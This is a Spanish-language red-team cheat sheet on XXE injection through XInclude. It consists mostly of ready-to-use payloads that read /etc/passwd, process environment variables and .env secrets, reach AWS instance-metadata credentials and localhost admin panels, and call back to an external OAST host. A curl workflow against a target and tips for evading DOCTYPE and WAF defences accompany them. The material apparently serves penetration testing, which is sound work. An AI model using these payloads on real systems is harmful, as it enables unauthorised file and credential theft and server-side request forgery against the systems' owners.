---
aliases: null
tags:
  - type/technique
  - vuln/xxe
  - technique/execution
  - asset/web-app
primary categories:
  - '[[Red Team]]'
secondary categories:
  - '[[Explotación]]'
tertiary categories:
  - '[[Web Explotación]]'
kind: SubCheatSheet
linked:
  - '[[XML External Entity (XXE)]]'
---
# XXE - Inyección Mediante XInclude

***

## Cheatsheet

| **Payload** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>` | Contenido raw de `/etc/passwd` | LFI sin control del `DOCTYPE`. `parse="text"` evita XML parse del target. |
| `<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///proc/self/environ"/></foo>` | Variables de entorno del proceso | Backend Linux, leak `DB_PASSWORD`/tokens. |
| `<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="php://filter/read=convert.base64-encode/resource=/var/www/html/.env"/></foo>` | `.env` base64 | Target PHP, archivo con caracteres XML-rompedores. |
| `<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="xml" href="file:///etc/fstab"/></foo>` | Contenido XML-parsed (sólo si el archivo es XML válido) | Archivos config XML — sino, parser explota. |
| `<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="http://169.254.169.254/latest/meta-data/iam/security-credentials/"/></foo>` | SSRF a IMDS AWS | Target en EC2, sin control del DOCTYPE. |
| `<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="http://127.0.0.1:8080/admin"/></foo>` | SSRF a admin panel localhost | Servicio interno con trust en loopback. |
| `<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="http://canary.oast.fun/probe"/></foo>` | Callback DNS+HTTP a Collaborator | Detección blind cuando no se refleja contenido. |
^xxe-xinclude

### Workflow rápido

```bash
# 1. Probe inocuo — confirmar que XInclude resuelve
curl -X POST https://target/api -H 'Content-Type: application/xml' \
  --data '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/hostname"/></foo>'

# 2. Si el input se embebe en un XML mayor (ej: JSON convertido a SOAP), no necesitás DOCTYPE
# Inyectás solo el nodo XInclude dentro del campo controlado.

# 3. Si XInclude está bloqueado pero hay control de DOCTYPE → usar [[XXE - Clásico In-band]]
```

___

## Overview

XInclude se usa cuando el atacante **no controla el inicio del documento XML** ni el `DOCTYPE` (porque la app envuelve el input dentro de un XML mayor en backend, p.ej. SOAP/JSON-to-XML). La especificación XInclude permite ensamblar documentos a partir de fragmentos externos.

### Requisitos

- Parser con XInclude habilitado. Java es el caso más común — `XMLInputFactory` con `XINCLUDE_AWARE=true`. Algunas libs lo activan por default.
- Namespace `xmlns:xi="http://www.w3.org/2001/XInclude"` declarado en el nodo controlado.
- `parse="text"` para archivos no-XML; `parse="xml"` (default) sólo si el target es XML válido.

### Limitaciones

- **Sanitización de `xmlns`:** algunos WAFs eliminan declaraciones de namespace → falla.
- **Ausencia de reflejo:** si la app procesa pero no devuelve el resultado → pivotar a [[XXE - Out-of-Band (OOB) y DTDs Externos]] con callback HTTP.
- **No hay DOCTYPE:** las defensas que sólo bloquean `<!DOCTYPE` no aplican — XInclude es alternativa directa.

***
